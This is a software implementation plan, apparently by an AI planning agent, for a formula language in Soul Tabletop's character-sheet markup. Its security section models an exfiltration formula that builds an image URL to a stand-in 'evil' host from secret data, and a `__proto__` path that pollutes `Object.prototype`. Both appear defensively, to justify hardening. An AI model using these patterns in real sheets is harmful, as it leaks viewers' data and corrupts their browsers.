# Sheet formulas: implementation plan

Written 2026-10-01 by a read-only planning agent for the user to review and edit before any code is written. The user's decisions (section 11) go at the top of this file when made, and the final design is recorded in `docs/sheet-system.md` as it is implemented. Tier and model suggestions are for the coordinator.

# Formulas for Soul Tabletop Sheets: implementation plan

I read `.claude/CLAUDE.md`, `docs/sheet-system.md`, everything in `shared/sheet/` (parser, registry, validate, runtime, editor), `app/composables/useSheet.ts`, `sheet/Renderer.vue`, `Node.vue`, `Field.vue`, `List.vue`, `Table.vue`, `Scope.vue`, `CodeEditor.client.vue`, the formula-related parts of `sheets/[id]/edit.vue`, `server/utils/sheet-schemas.ts`, `content-refs.ts`, `content-validation.ts`, `api-schemas.ts`, `server/api/content/[id].get.ts`, the Sheets skill, and the two TODO items (plus "hide Sheet warnings"). Nothing was written.

**What I recommend:** formulas live in the sheet markup and are computed only when the sheet is shown, never stored. They come with named, reusable definitions. Computed fields in the content type schema are a later, separate step that reuses the same engine.

---

## 1. Where formulas live and the syntax

### Options considered

**A. A `formula=` attribute on display field tags (recommended, together with B and C).** It replaces `field`:

```
<Number formula="$mod(abilities.str)" label="STR" format="signed" variant="stat" />
```

- It is read-only in every mode. `useSheetEditable` already treats a `null` path as not editable, so a formula field returns `{ value, path: null }` and the `live`, `locked` and Edit Fields logic needs no new branch.
- `display="box"` still shows the disabled input, so character sheets look the same with Edit Fields on and off.
- Allowed on `Value`, `Number`, `Text`, `Checkbox`, `Column` and `Tracker`. `Column` also gains `format`.
- Not allowed on `Image`, `Ref`, `Markdown`, `Select`, `Tags`, or on `List`/`Table` (see section 7: an `Image` formula could leak data).

**B. `{= expr}` interpolation**, in text and in text attributes. Example: `<Badge>Initiative {= signed($mod(abilities.dex))}</Badge>`.
- A number attribute also accepts exactly one `{= expr}`: `max="{= hp.max + coalesce(hp.temp, 0)}"`.
- The existing `{path}` interpolation is unchanged and behaves like `{= path}`.

**C. `<Define>` tags for reuse.** They render nothing and may only appear at the top level or directly inside `<Sheet>`. They are hoisted, so order doesn't matter.
- Without parameters: `<Define name="pb" formula="ceil(level / 4) + 1" />`
- With parameters: `<Define name="mod" params="score" formula="floor(($score - 10) / 2)" />`
- They are referenced as `$pb` or `$mod(x)`, so there are four namespaces that never collide:
  - a bare identifier is always a data path;
  - `name(` is a built-in function;
  - `$name` is a sheet definition or a parameter;
  - `/` and `.` keep their current meaning (root, current item).
- Without this, the 18 D&D skills would each repeat the proficiency expression.

**D. Computed fields in the content type schema** (`{ type: "number", formula: "…" }` in `ContentFieldSchema`). **Deferred** to a later PR (section 10, PR 6), not rejected:
- It is the "right" home for rule facts that API users, generated sheets and other sheets want to see.
- But it touches the TypeBox schema in `contentTypeSchemaSchema`, the schema builder, `content-validation.ts` (writes to computed keys), `defaultContentData`, the generator, strict schemas, the content GET response shape, and the question of what each viewer can see through references (section 5).
- The engine is designed so that D adds a way of resolving paths, not a new language.

**Rejected:**
- A standalone `<Computed>` tag. It duplicates the field tags' looks (stat, box, signed).
- Full expressions inside today's `{path}`. That would be ambiguous with plain paths, and the `=` marker keeps old sheets parsing exactly as before.
- Writing `field` and `formula` on the same tag. That is an error in v1, kept free for "computed default with override" (decision 4).

### How this interacts with the existing markup

**Parser (`shared/sheet/parser.ts`):**
- `TextPart` gains `{ formula: string; loc: Loc; bodyStart: Position }`.
- In `parts()`, when the text after `{` is `=`, the scan for the closing `}` must skip over quoted strings, so `{= concat("}", x)}` works.
- In `text()`, after an unescaped `{=`, the scan must jump to the matching `}` before looking for markup. Otherwise `{= a <b}` is read as an opening tag. This applies only to `{=`, so existing `{path}` behaviour is byte-for-byte the same.
- `SheetAttr` gains the raw value text and its start `Position`. The formula lexer works on the raw source (and decodes `&lt; &gt; &amp; &quot; &apos;` itself), so diagnostic positions inside attribute values stay exact. Entity decoding would otherwise shift the offsets.
- Quoting: inside `formula="…"` an expression can't contain `"`. Expression strings accept both `'` and `"`, and the docs say to use `'` inside double-quoted attributes. The syntax-error message suggests this.

**Registry (`shared/sheet/registry.ts`):**
- New attribute type `{ kind: "formula" }`.
- `field` is required "unless `formula` is given". `TagSpec` gets `formula?: true`, and `attributes()` in `validate.ts` checks "exactly one of field/formula".
- New `Define` tag with category `"definition"`, attributes `name` (identifier), `params` (comma list of identifiers, at most 8) and `formula` (required).
- `Node.vue`'s component map leaves `Define` out, so it renders nothing.

**`live` / `locked` / `display`:**
- Inherited flags are ignored on formula fields.
- Writing `live` or `locked` directly on a formula tag gives a `flag-no-effect` warning.

## 2. The expression language

### Where the code goes

Hand-written lexer and Pratt parser, no dependencies, in new files that follow the repo's flat layout:

| File | Contents |
|---|---|
| `shared/sheet/formula.ts` | lexer, parser, AST, limits |
| `shared/sheet/formula-functions.ts` | the function library as data: name, min/max arity, parameter kinds, lazy flag, which arguments are scoped to each item, static result type, implementation, description and signature for the editor |
| `shared/sheet/formula-eval.ts` | evaluator |
| `shared/sheet/formula-check.ts` | static type inference |

It never uses `eval` or `new Function`, and nothing in it uses Vue or Nuxt.

### Grammar

Precedence from low to high:

| Level | Operators | Notes |
|---|---|---|
| 1 | `or` | |
| 2 | `and` | |
| 3 | `==` `!=` | |
| 4 | `<` `<=` `>` `>=` | non-associative |
| 5 | `+` `-` | `+` is numbers only |
| 6 | `*` `/` `%` | |
| 7 | unary `-`, `not` | |
| 8 | primary | see below |

**Primary expressions:**
- **Literals:**
  - numbers: digits with an optional fraction and no leading `.`;
  - `'str'` or `"str"` with `\'`, `\"` and `\\` escapes;
  - `true`, `false`, `null`.
- **Paths:** the `isValidSheetPath` form, with `.` for the current item and a leading `/` for the root.
  - In prefix position, a `/` followed directly by an identifier starts an absolute path. In infix position it is division, which the Pratt parser separates naturally.
  - A path followed by `(` is a function call. A dotted path followed by `(` is an error.
- **Names:** `$name`, or `$name(args)` for a call.
- **Calls:** `fn(args)`.
- **Parentheses.**
- **Dice:** `NdM` (for example `1d20`) is reserved as a dice token (section 6).

**Reserved words:** `and`, `or`, `not`, `true`, `false`, `null`. A data field with one of these names is reached as `/and` or `.and`.

**Conditionals:** `if(cond, then, else)` and `switch(value, k1, v1, …, default)`. Both are lazy. There is no ternary: one spreadsheet-style form only (decision 5).

### AST

```
number | string | boolean | null
path { path: SheetPath, text }     // reuses parseSheetPath
name { name }                      // a $name
unary { op, operand }
binary { op, left, right }
call { name, user: boolean, args }
dice { count, sides }
```

Every node carries a `loc`.

### Function library (v1)

| Group | Functions | Notes |
|---|---|---|
| Math | `floor`, `ceil`, `round(x, digits?)`, `trunc`, `abs`, `clamp(x, lo, hi)` | `round` rounds half away from zero, unlike JavaScript's `Math.round` |
| Min/max | `min(...)`, `max(...)` | numbers, or a single array argument |
| Aggregates | `sum(list)`, `sum(list, expr)`, `count(list)`, `count(list, cond)`, `any(list, cond)`, `all(list, cond)` | `expr`/`cond` is evaluated once per item, scoped to that item like a `List` (relative paths inside it, `/` is the root): `sum(inventory, qty * item.weight)` |
| Size | `length(x)` | a string or array |
| Null handling | `coalesce(a, b, …)` | |
| Text | `concat(...)`, `join(list, sep)`, `signed(n)` | `signed` gives "+3", "0" or "-1" |
| Conversion | `number(x)`, `text(x)` | `number` parses a string explicitly |
| Logic | `if`, `switch` | lazy |

**Reserved, not implemented:** `roll`, `dice`, `get`.

**Left out on purpose:**
- regular expressions (catastrophic-backtracking DoS);
- dynamic key lookup `get(record, key)` (a prototype-access risk, and it makes paths impossible to check statically; `switch` covers "spellcasting ability");
- dates, randomness, locale formatting (they break SSR determinism).

### Types and coercion

- **Runtime values:** number (finite), string, boolean, null. Arrays and records exist only as path results fed to aggregates or `length`. A formula whose final result is an array or record is a type error.
- **No implicit coercion:**
  - `+ - * / %` and `<`-type comparisons take numbers only;
  - `==` and `!=` compare type and value, so `1 == "1"` is false;
  - `if`, `and`, `or` and `not` take booleans, and null counts as false.
- **Missing values** (absent, unavailable reference, a path through a non-object) are `null`.
  - Arithmetic with null gives null, which renders empty (decision 6).
  - Aggregates skip null items. `sum([])` is 0, `count([])` is 0, and `min`/`max` of an empty list is null.
- **Errors are values, never exceptions.** The evaluator returns a `FormulaError { code, message }` for a type mismatch, division by zero, a non-finite result, an exhausted budget, or a too-long string. Errors propagate through operators. `coalesce` does not swallow errors, only null.
- **Display:** non-integer formula results go through `Number(x.toPrecision(12))` so 0.1+0.2 doesn't show its float noise. The formatting must not depend on the locale (SSR and hydration must match).

### Hard limits (`formulaLimits`, enforced by parser, checker and evaluator)

| Limit | Value |
|---|---|
| Expression length | 1,000 characters |
| AST nodes per formula | 200 |
| Nesting depth | 32 |
| Function arguments | 32 |
| `<Define>` tags per sheet | 200 |
| Formula sites per sheet | 2,000 (the parser's 5,000-node limit already applies) |
| Nesting of per-item aggregates | 2 levels (so `sum(a, sum(b, …))` is fine, a third level is an error) |
| Evaluation steps per evaluation | 20,000 (every node visit and every aggregate item counts) |
| Call depth for definitions | 16 (defence in depth; definitions are statically acyclic anyway) |
| String results | 10,000 characters |

### Signatures

- `parseFormula(source, start: Position): { ast?: FormulaNode; diagnostics: SheetDiagnostic[] }`. The lexer tracks line and column from `start`, so multi-line attributes map correctly.
- `evaluateFormula(ast, env): FormulaValue`, where:
  - `env = { root: SheetScope; scope: SheetScope; refs: SheetRefs; params?: Record<string, FormulaValue>; definition(name, args?): FormulaValue; budget: { steps: number } }`
  - Paths are resolved with `resolveSheetPath` from `runtime.ts`, so reference following, `unavailable` and the 3-level depth rule are the same as everywhere else.
  - It catches any internal exception and turns it into `FormulaError("internal")`.

## 3. Dependencies and evaluation

**Dependency graph.** Display formulas have no names, so only definitions can depend on each other.
- At validate time, build the graph of `$name` references and calls between `<Define>` tags and run a DFS.
- Every definition in a cycle gets a `formula-cycle` error naming the cycle (`$a → $b → $a`), and evaluates to an error.
- Calling a definition with the wrong number of arguments, or an unknown `$name`, is an error.
- Parameters are visible only inside their own definition.
- No topological order is needed at runtime, because evaluation is on demand and memoised.

**Runtime wiring (Vue): one computed per node, not a pre-pass.**
- `Renderer.vue` already holds the draft as reactive `props.data`. The evaluator reads it through ordinary property access, so Vue tracks exactly what each formula read.
- Editing `abilities.str` in edit mode re-runs only the formulas that read it.
- `compileSheet` parses each formula once per markup change and stores the AST in the validated tree (`ValidatedElement.formula`, formula parts in `parts`). Nothing is re-parsed per render.
- **Definitions without parameters:** one `computed` each, created in `Renderer.vue` and reached through `SheetContext.definition(name)`. They are memoised and reactive.
- **Definitions with parameters:** evaluated inline at each call (cheap, and bounded by the budget).

**Changes in the composable and components:**
- `useSheet()` gains `evaluate(ast)`, which uses the current `scope`.
- `text()` and `number()` handle formula parts.
- In `Field.vue`, `resolved` becomes `formula ? { value: evaluate(formula), path: null } : resolve(binding.path)`. It must stop assuming `binding!` exists.
- `Table.vue` column headers fall back to `label` when there is no binding.

**List and Table rows.** A formula's relative paths resolve against the innermost item, exactly like `{path}`, and `/` reaches the root. Inside a row, definitions run against the root; pass row values in as arguments: `$lineWeight(qty, item.weight)`.

**Across references.** Paths through `content` fields go through `refs`, which `loadContentRefs` filled with what this viewer can read, up to 3 hops. An unreadable reference resolves to `unavailable`, which formulas treat as null.
- Consequence: different viewers can see different totals. That is inherent and is not a leak.
- A referenced item's *own sheet formulas* are not visible (for example an item's computed total weight). That is the main argument for schema-level fields later.

**Cost.** The D&D sheet has about 60–80 formula sites and needs well under 1 ms per edit. Rows multiply the sites, but every evaluation is capped by the 20,000-step budget.
- SSR: `ContentDetail.vue` renders `SheetRenderer` outside `<ClientOnly>`, so formulas also run on the server during page render. The budget therefore protects the server as well.
- Evaluation must be deterministic to avoid hydration mismatches.

## 4. Static validation and editor support

### In `validate.ts`

The formula checker in `formula-check.ts` takes a callback, `resolvePath(path, loc) → FormulaType`. `Validator` supplies the callback using its existing private `resolve()`/`step()` with the current scope `Shape`. This way the strict, non-strict, free-form `object` and `content-too-deep` rules, and the coming "hide sheet warnings" flag, apply to formula paths automatically, with no second implementation.

- **Type set:** `number`, `string`, `boolean`, `null`, `array<T>`, `record`, `any`, plus unions.
- **Mapping:** a `scalar` field is a union of the three scalars plus null; non-strict, unknown or `object` paths are `any`, which is never a type error.

**Diagnostics:**

| Case | Strict | Non-strict |
|---|---|---|
| Unknown path in a formula | error (`unknown-field`) | warning, which the hide-warnings flag can hide |
| Path into a free-form `object` | warning (`free-form-path`) | same |
| Syntax error, unknown function, wrong arity, unknown `$name`, cycle, limit exceeded | error | error |
| Operand types known and incompatible (`"a" * 2`, `sum` of a string field) | error (`formula-type`) | error |
| Result type doesn't fit the tag (`Number` needs number, `Text` string, `Checkbox` boolean, `Column` a scalar, `Value` anything, number attributes number) | error (`formula-result-type`) | error |
| Both `field` and `formula`, or neither | error | error |
| A dice token outside a roll context | error ("dice rolls aren't available here yet") | same |

- New diagnostic codes all start with `formula-`: `formula-syntax`, `formula-unknown-function`, `formula-arity`, `formula-unknown-name`, `formula-cycle`, `formula-too-large`, `formula-type`, `formula-result-type`.
- Only the path warnings count as "schema-related" warnings for the hide-warnings flag.
- `ValidationResult` gains `definitions`.

**Saving and schema changes:**
- `assertValidSheetMarkup` rejects formula errors on save with no changes.
- `findSheetsBrokenBy` (the `confirmBrokenSheets` path) diffs error *messages* before and after a schema change, so formula messages must be deterministic and contain the path. Example: a content type PATCH that turns `abilities.str` into a string newly breaks `$mod(abilities.str)` and is listed in the 409.

### Editor (`CodeEditor.client.vue`, `edit.vue`)

**Completion.** Extend `fieldPathSource`:
- Detect the context with `syntaxTree(state).resolveInner(pos, -1)`, by finding an `AttributeValue` whose attribute name is `formula`, or a `{= …` before the cursor that hasn't been closed.
- In those places offer:
  - paths, using the existing tail logic for List items;
  - the built-in functions, with signature and description from `formula-functions.ts`;
  - the `$names` from the last compile (a new `formulaNames` prop fed from `compiled.definitions`).

**Problems list and lint.** Positions already work through line and column (`codemirrorDiagnostics`), as long as the parser supplies the attribute value positions (section 1).

**Reference slide-over.** A "Formulas" section generated from the function registry: operators, functions, `$` definitions, and the limits.

## 5. Data model

**Recommendation: render-time only. Nothing is written to `content.data`, and nothing changes in `ContentFieldSchema`, TypeBox, the schema builder or the database.**

| Area | Consequence |
|---|---|
| Strict schemas | Unaffected (no extra keys in the data). |
| REST API | `GET /api/content/[id]` doesn't return computed values. Document it ("values computed by a sheet's formulas aren't part of `data`") in the endpoint's OpenAPI description. |
| Export / print | The rendered sheet shows the values; a JSON export doesn't. |
| Authoring CLI and skills | Formulas are just `.stts` text; nothing special. |
| List columns, indexed fields, search | Can't use them. These need SQL over stored `jsonb`; if ever wanted, that's a schema-level "materialized" field computed at write time from the record's own data only (no references), as a separate decision. |

**Why not stored:**
- If values were computed on save, they would use the *saving* user's `refs`. A viewer who can't read a referenced item would then see values derived from it. That is a real leak.
- It also creates staleness: a referenced item changes and nothing re-saves.
- Computing on the server for API reads is possible with the viewer's own refs (later, schema-level), but it is a per-request cost on every content GET.

**If schema-level computed fields come later (PR 6):**
- Add `formula?: string` to the `number`, `string`, `boolean` and `scalar` field shapes, in both `content-schema.ts` and `api-schemas.ts`.
- `assertContentTypeSchema` parses and type-checks it, including cycles across fields; relative paths are against the containing record, `/` is the root.
- Content writes drop computed keys.
- `defaultContentData` skips them; the generator emits `Value`.
- The runtime gets a schema-aware way to resolve a path to a computed field.
- The GET response adds `computed` evaluated with the viewer's refs.

## 6. Dice: what to reserve now

- **Lexer:** `\d*d\d+` is lexed as a dice token, so `2d6` is never read as `2` followed by a path `d6`. It gives an AST node `dice { count, sides }`. The validator errors on it outside roll contexts, and the evaluator returns `FormulaError("dice")` when no `rng` is supplied.
- **Function names reserved:** `roll`, `dice`, `adv`, `dis`.
- **Tag and attribute names reserved:** `Roll` and `roll` (no use today).
- **Engine shape:** a `dice` member in the type set, and an `env.rng?` hook for later. A future `evaluateRoll(ast, env, rng)` reduces everything except the dice terms to numbers, prints something like "1d20 + 5", and rolls.
- **Damage text today** works without dice support: `{= concat("1d8", signed($mod(abilities.str)))}`.

## 7. Security and abuse

Sheet markup is written by one user and runs in other users' browsers and in SSR on the server.

| Threat | Mitigation |
|---|---|
| CPU (deep nesting, nested aggregates over large arrays, many formula sites, in SSR and in the browser) | The limits in section 2; no loops or recursion (definitions statically acyclic, plus a runtime call-depth guard); no regular expressions; a linear lexer; budget errors render as an error marker. |
| Memory | No array constructors; string results capped at 10,000 characters; `join`/`concat` checked against the cap as they build. |
| **Prototype access and pollution** | See the existing bug below. In the evaluator, use `Object.hasOwn` for every record read and never call anything taken from data. |
| Reading data the viewer can't read | Formulas only see `data`, plus the `refs` and `links` that `loadContentRefs` filtered for this viewer. Paths can't go below `resourceLink` (link names aren't readable by formulas). No stored values (section 5). |
| **Sending data off the site** | A formula on `Image` (`concat('https://evil/?', secret)`) would leak data the *viewer* can read to the sheet author's server. So: no `formula` on `Image`, and never in any attribute that becomes a URL. Formula output only reaches text through Vue's text rendering, never HTML. Scoped CSS already bans `url()`. |
| Leaking restricted references | Unavailable resolves to null, the same as missing, so nothing distinguishes "restricted" from "empty" beyond what the UI already shows. |
| Misleading output | Errors are visible only to people who can edit the sheet (`showInvalid`); everyone else sees "—". |

**Existing bug to fix (I believe this is real but haven't run it).** `isValidSheetPath` allows `__proto__` and `constructor`, and `resolveSheetPath` reads `container[segment]` without `Object.hasOwn`.
- In a non-strict schema (only a warning), `<Text field="__proto__.x" />` in edit mode builds the path `["__proto__","x"]`.
- `setSheetValue` would then write to `Object.prototype` in the editing user's browser.
- Fix:
  - reject `__proto__`, `prototype` and `constructor` path segments in `isValidSheetPath`;
  - use `Object.hasOwn` in `resolveSheetPath`;
  - make `setSheetValue` refuse those keys;
  - consider rejecting `__proto__` in `fieldKeyPattern` too.
- Verify with a test first. This is PR 0.

## 8. Testing strategy

**vitest layers:**
1. **`formula.test.ts` (parser):**
   - every operator and its precedence and associativity;
   - `/` as root path vs division;
   - `.` paths, `$name` calls, reserved words, the dice token, string escapes;
   - each syntax error with its exact line and column, including multi-line attributes and the entity-decoded `&lt;`;
   - every limit.
2. **`formula-eval.test.ts` (evaluator):**
   - one table of cases per function;
   - null propagation, aggregates skipping null, empty arrays, division by zero, non-finite results, the budget running out, string caps;
   - `__proto__` and `constructor` paths returning null;
   - paths through `refs`, including unavailable ones;
   - item scoping in aggregates.
   - Plus a seeded random fuzz written in the repo with its own PRNG, no new dependency: random token soup never throws; evaluation always ends within the budget; printing then re-parsing an AST gives the same AST.
3. **`formula-check.test.ts`, plus new cases in `validate.test.ts`:**
   - type inference over strict, non-strict, `scalar`, `object` and `content` shapes;
   - result type against each tag;
   - cycles, arity, unknown `$name`;
   - `field` and `formula` together or both missing;
   - `Define` placement;
   - diagnostic positions inside attributes and `{= }`;
   - formula messages showing up in a `findSheetsBrokenBy`-style before/after diff.
4. **`parser.test.ts`:**
   - `{=` scanning past `<` and `}` inside strings;
   - old `{path}` behaviour unchanged;
   - the new attribute value positions.
5. **`runtime.test.ts`:** formula parts in `interpolateSheetText`; number attributes.
6. **`generate.test.ts`:** generated markup still validates cleanly (no change expected).

**D&D 2024 worked example** (a fixture in `validate.test.ts` and later the skill's `examples.md`). It assumes `skills.<name>.training` is a string `none`/`proficient`/`expertise`, `saves.<ab>` is a boolean, and `spellcasting.ability` is a string.

```
<Define name="pb" formula="ceil(level / 4) + 1" />
<Define name="mod" params="score" formula="floor(($score - 10) / 2)" />
<Define name="skill" params="score, t" formula="$mod($score) + switch($t, 'proficient', 1, 'expertise', 2, 0) * $pb" />
<Define name="castMod" formula="$mod(switch(spellcasting.ability, 'int', abilities.int, 'wis', abilities.wis, 'cha', abilities.cha, null))" />
```

1. **Ability modifier:** `<Number formula="$mod(abilities.str)" label="STR" format="signed" variant="stat" />`
2. **Skill bonus:** `<Value formula="$skill(abilities.dex, skills.stealth.training)" label="Stealth" format="signed" />`
3. **Saving throw:** `<Value formula="$mod(abilities.wis) + if(saves.wis, $pb, 0)" label="WIS save" format="signed" />`
4. **Passive Perception:** `<Number formula="10 + $skill(abilities.wis, skills.perception.training)" label="Passive Perception" />`
5. **Spell save DC:** `<Number formula="8 + $pb + $castMod" label="Spell Save DC" variant="stat" />`
6. **Spell attack bonus:** `<Value formula="$pb + $castMod" label="Spell Attack" format="signed" />`
7. **Signed value in text:** `<Badge>Initiative {= signed($mod(abilities.dex))}</Badge>`
8. **Inventory weight:**
   - per row: `<Column formula="qty * item.weight" label="Weight" />` inside `<Table field="inventory">`
   - total: `<Value formula="sum(inventory, qty * coalesce(item.weight, 0))" label="Carried" />`
   - conditional text: `{= if(sum(inventory, qty * item.weight) > abilities.str * 15, 'Encumbered', '')}`

**Browser checks** (Playwright, using `withSmokeUser`):
- Open content of a D&D-like type in edit mode, change STR, and confirm the modifier, skills, saves and DC update without reloading.
- Toggle `display="box"`: computed values show as disabled inputs and are never focusable for editing.
- Check the console for hydration warnings (this tests the SSR determinism).
- A sheet editor sees the error marker for a formula dividing by zero; another viewer sees "—".
- The sheet editor's Problems list jumps to the right column inside `formula="…"`.
- Completion offers `floor` and `$mod`.

## 9. Docs and skill updates

**`docs/sheet-system.md`:**
- §1 "Syntax": the `{= expr}` interpolation line (replace "no expressions until the formulas phase").
- §1 "AST": the formula `TextPart` and the attribute value positions.
- §2: `formula` in the common field attributes, `Define` in the tag table, `format` on `Column`, and which tags accept `formula`.
- A new section ("Formulas"): grammar, functions, types and nulls, errors, limits, scoping, `$` namespace, dice reservation, security rules (no URL outputs).
- §3: the new rows in the validation table.
- §5: formula fields are read-only; how `live`/`locked`/`display` apply.
- §8 phase 9: mark formulas done and point at the new section.
- Record the decisions (render-time, no storage, schema-level deferred).

**Sheets skill:**
- `SKILL.md`: the interpolation bullet, a new "Formulas" section, and the tag-binding bullets.
- `references/tags.md`: the `formula` attribute, `Define`, `Column format`.
- `references/examples.md`: a new D&D example using the formulas above.
- `references/checking.md`: "Formula path warnings follow the same rules; the check doesn't evaluate formulas."

**OpenAPI:** one sentence in the description in `server/api/content/[id].get.ts` (and the sheet GET's) that computed values aren't in `data`.

**README:** nothing needed beyond that. `CLAUDE.md`'s Sheet bullet should name the formula files in `shared/sheet/`.

## 10. PRs, in order

| # | Scope and files | Tier | Model | Risks | What it leaves working |
|---|---|---|---|---|---|
| 0 | **Path hardening:** `isValidSheetPath`, `resolveSheetPath` (`Object.hasOwn`), `setSheetValue`, maybe `fieldKeyPattern`; tests | B | Sonnet | Could reject an existing sheet that uses those names (unlikely) | Closes the possible prototype write; independent of formulas |
| 1 | **Engine:** `formula.ts`, `formula-functions.ts`, `formula-eval.ts`, `formula-check.ts` (callback-based, no `validate.ts` changes) and tests. Unused by the app. | B | **Opus** (semantics and limits are the security boundary) | Getting the semantics wrong is costly to change later | Nothing visible; can run in parallel with the hide-warnings branch, since `validate.ts` is untouched |
| 2 | **Formulas in markup:** parser (`{=`, attribute value positions), registry (`formula`, `Define`, `Column format`), Validator wiring (definitions, cycles, types, result-type checks, codes), `useSheet`/`Renderer`/`Field.vue`/`Table.vue` evaluation, error marker; `docs/sheet-system.md` and the skill's reference text in the same PR | B | **Opus** | Parser change in text scanning; Vue tracking; `binding!` assumptions in components; merge order with hide-warnings (both touch `validate.ts`: land hide-warnings first, or rebase) | Formulas usable end to end; saves rejected on formula errors; the `confirmBrokenSheets` diff covers them |
| 3 | **Editor support:** formula-context completion (functions, paths, `$names`), signature info, Formulas section in the reference slide-over, `formulaNames` prop | A | Sonnet | lang-xml mis-highlighting `{= a < b}` in text (spike first) | Comfortable authoring |
| 4 | **D&D example and skill polish:** `examples.md` D&D section, `checking.md`; on the `docs` branch if only agent files change | A | Sonnet | none | Agents can write formula sheets |
| 5 | *(optional, cheap)* **Conditional display:** a `show="{= …}"` boolean attribute on any tag, `v-if` in `Node.vue` (the TODO's `if=`) | B (registry) | Sonnet | Name choice (`show` vs `if`) | Hide the Spells tab for non-casters |
| 6 | *(later, needs decision 1)* **Schema-level computed fields** (section 5) | B | Opus | Large; API shape | API consumers and generated sheets see computed values |

Dice buttons stay their own follow-up, built on the PR 1 reservations.

## 11. Decisions that are yours to make

1. **Where formulas live.**
   - **(Recommended) Sheet markup now, schema-level later:** fast, no data model change, no leak through references.
   - Schema-level computed fields only: reusable and visible to the API, but much larger, and it raises stored-vs-computed and per-viewer questions.
   - Both now: the most value, but the most review.
2. **How formulas are reused.**
   - **(Recommended) `<Define>` with parameters, `$name` syntax.**
   - Definitions without parameters only: simpler, but the skills still repeat expressions.
   - Built-in RPG helpers like `mod()`: convenient, but the language becomes system-specific.
3. **Stored or computed.**
   - **(Recommended) Render-time only.**
   - Stored on save: values show in lists, but it leaks restricted references and goes stale.
   - Computed on the server for API reads: viewer-correct, but a cost on every GET (this naturally belongs with schema-level fields).
4. **Can a computed value be overridden?**
   - **(Recommended) Not in v1.** Authors add an adjustment field into the formula (`+ coalesce(misc, 0)`), and `field`+`formula` stays reserved.
   - `field`+`formula` as a computed default the user can override (empty means automatic): good for AC; ship it now or later.
   - Unlock-to-override with the pencil button: confusing about what is stored.
5. **Syntax style.**
   - **(Recommended) Spreadsheet-like:** `if()`, `and`/`or`/`not`, `concat()`.
   - JavaScript-like: `?:`, `&&`, `||`; `&&` then fights with the entity rules.
   - Accept both: more to learn and document.
6. **Missing values.**
   - **(Recommended) A missing value empties the result, aggregates skip missing items, `coalesce` gives a default.**
   - Missing counts as 0, like a spreadsheet: friendlier, but hides missing data (an empty STR would show mod −5).
7. **Who sees formula errors.**
   - **(Recommended) Sheet editors see a marker and the message; everyone else sees "—".**
   - Everyone sees "Error".
   - Nobody sees anything (errors are silent).
8. **Function set in v1.**
   - **(Recommended) The list in section 2.**
   - Add string helpers (`upper`, `lower`, `contains`) now.
   - Add dynamic `get(record, key)`: handy for "spellcasting ability", but weakens static checks and adds prototype risk.
9. **Names.**
   - **(Recommended) `Define` + `$name`.**
   - `Let` + `$name`.
   - `Calc` + `@name`.
   - Also choose `show` or `if` for PR 5.

## 12. Risks and unknowns (spike first)

1. **Spike before PR 2: Vue tracking and hydration.** Confirm a `computed` in `Field.vue` re-runs when a dependency elsewhere in the draft changes (the draft from `useContentDraft` is mutated in place by `setSheetValue`). Check that SSR and client output match with no hydration warnings.
2. **Spike before PR 3: lang-xml and `<` in text.** `@codemirror/lang-xml` may treat `{= a <b}` in text as a tag, breaking highlighting and auto-close, even though our parser is fine. A fallback rule could be "write `a < b` with spaces" or "use `&lt;`".
3. **Prototype bug not reproduced.** The section 7 finding is from reading the code; reproduce it in a test first (Vue's reactive `get` for `__proto__` returns the raw prototype).
4. **Budget sizes are guesses.** Measure a pathological sheet (2,000 sites in a 500-row List) in SSR.
5. **Merge order with hide-warnings.** Both change `validate.ts`; the "hide sheet warnings" branch isn't on `main` yet. Routing formula paths through `step()` keeps them compatible, but expect a rebase.
6. **Formulas in referenced content's sheets aren't visible** (an item's computed weight). Watch whether the D&D build needs that; if so, schema-level fields move up.
7. **Fixed-row skills.** 18 skills still mean 18 field tags until the "Tables for fixed rows" TODO lands. Formulas reduce each one to a one-line call but don't remove the repetition.

---

## Summary

**What I'd build:** formulas in sheet markup, computed when the sheet is shown and never stored. Three surfaces:
- `formula="…"` on read-only display tags (`Value`, `Number`, `Text`, `Checkbox`, `Column`, `Tracker`; never `Image`);
- `{= expr}` in text, text attributes and number attributes;
- top-level `<Define name params formula>` for reuse, written `$name`.

The language:
- spreadsheet-style, parsed by a hand-written Pratt parser in `shared/sheet/formula*.ts`;
- no implicit type coercion; missing values empty the result; errors are values and never thrown;
- per-item aggregates (`sum(inventory, qty * item.weight)`), `if` and `switch`, `signed()`;
- hard limits on size, depth, steps and string length; `NdM` dice tokens reserved for dice buttons.

How it plugs in:
- The validator checks formula paths through the existing `resolve()`, so strictness, free-form objects and the hide-warnings flag apply unchanged. It adds type, arity, cycle and result-type errors.
- Rendering uses one Vue `computed` per formula site, plus one per definition without parameters.
- No database, schema, API or CLI changes. Schema-level computed fields are a possible later PR on the same engine.

**Order:**
- PR 0: path hardening (`__proto__`), Tier B, Sonnet
- PR 1: engine and tests, unused, Tier B, Opus (can run alongside hide-warnings)
- PR 2: markup, validation and rendering, plus design doc and skill reference, Tier B, Opus (after hide-warnings merges)
- PR 3: editor completion and reference panel, Tier A, Sonnet
- PR 4: D&D worked example in the skill, Tier A, Sonnet
- optional PR 5: `show=` conditional display
- later PR 6: schema-level computed fields

Spike Vue tracking and hydration before PR 2, and lang-xml's handling of `<` before PR 3.

**Decisions I need from you** (section 11):
1. Sheet-level now, schema-level later?
2. `<Define>` with parameters and the `$name` syntax?
3. Render-time only, never stored?
4. No override in v1, with `field`+`formula` reserved?
5. Spreadsheet-style syntax?
6. Missing values empty the result rather than counting as 0?
7. Errors shown only to sheet editors?
8. The v1 function set?
9. Tag and sigil names (`Define`/`$`), and `show` vs `if` for conditional display?

### Critical Files for Implementation
- /home/lucy/Developer/soultabletop/shared/sheet/parser.ts
- /home/lucy/Developer/soultabletop/shared/sheet/validate.ts
- /home/lucy/Developer/soultabletop/shared/sheet/registry.ts
- /home/lucy/Developer/soultabletop/shared/sheet/runtime.ts
- /home/lucy/Developer/soultabletop/app/composables/useSheet.ts
- (also: /home/lucy/Developer/soultabletop/app/components/sheet/Field.vue, /home/lucy/Developer/soultabletop/app/components/sheet/Renderer.vue, /home/lucy/Developer/soultabletop/app/components/CodeEditor.client.vue, /home/lucy/Developer/soultabletop/server/utils/sheet-schemas.ts, /home/lucy/Developer/soultabletop/docs/sheet-system.md, /home/lucy/Developer/soultabletop/.claude/skills/soul-tabletop-sheets/SKILL.md)

